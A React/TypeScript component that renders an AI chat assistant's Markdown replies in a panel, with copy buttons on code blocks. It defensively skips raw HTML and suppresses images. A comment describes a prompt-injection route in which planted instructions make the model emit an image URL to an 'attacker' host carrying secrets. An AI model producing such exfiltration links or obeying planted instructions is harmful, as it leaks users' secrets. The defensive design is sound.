import { faCheck, faCopy } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { CopyButton, Typography } from '@mantine/core';
import Markdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import ActionIcon from '@/elements/buttons/ActionIcon.tsx';
import Tooltip from '@/elements/overlays/Tooltip.tsx';
import Code from '@/elements/typography/Code.tsx';
import Text from '@/elements/typography/Text.tsx';
import { markdownComponents } from '@/providers/TranslationProvider.tsx';
import { useExtTranslations } from '../translations.ts';

function CodeBlock({ content, language }: { content: string; language: string | null }) {
  const { t: tExt } = useExtTranslations();

  return (
    <div className='group relative my-2'>
      {language && (
        <Text size='xs' c='dimmed' className='absolute top-1.5 left-3 select-none'>
          {language}
        </Text>
      )}
      <Code block className={`overflow-x-auto pr-10! ${language ? 'pt-7!' : ''}`}>
        {content}
      </Code>
      <CopyButton value={content} timeout={1500}>
        {({ copied, copy }) => (
          <Tooltip label={copied ? tExt('markdown.copied', {}) : tExt('markdown.copy', {})}>
            <ActionIcon
              size='sm'
              variant='subtle'
              color={copied ? 'green' : 'gray'}
              className='absolute! top-1.5 right-1.5 opacity-60 transition-opacity group-hover:opacity-100'
              onClick={copy}
              aria-label={tExt('markdown.copy', {})}
            >
              <FontAwesomeIcon icon={copied ? faCheck : faCopy} />
            </ActionIcon>
          </Tooltip>
        )}
      </CopyButton>
    </div>
  );
}

// Raw HTML is skipped, so model output cannot inject markup; links go through the panel's own safe
// link component and only load on a click.
const components: Components = {
  ...markdownComponents,
  // Images load as soon as they render: an instruction planted in a file or the console could make
  // the model put secrets into `![](https://attacker/?d=…)`. Never render them.
  img: () => null,
  // The panel's translation markdown renders paragraphs inline; chat answers need real ones.
  p: ({ children }) => <p>{children}</p>,
  code: ({ className, children }) => {
    const content = String(children ?? '').replace(/\n$/, '');
    const language = /language-([\w+-]+)/.exec(className ?? '')?.[1] ?? null;
    if (!language && !content.includes('\n')) {
      return <Code>{content}</Code>;
    }
    return <CodeBlock content={content} language={language} />;
  },
};

export default function ChatMarkdown({ text }: { text: string }) {
  return (
    <Typography className='min-w-0 break-words text-sm leading-relaxed [&_ol]:list-decimal [&_ol]:pl-6 [&_p:first-child]:mt-0 [&_p:last-child]:mb-0 [&_ul]:list-disc [&_ul]:pl-6'>
      <Markdown remarkPlugins={[remarkGfm]} components={components} skipHtml>
        {text}
      </Markdown>
    </Typography>
  );
}
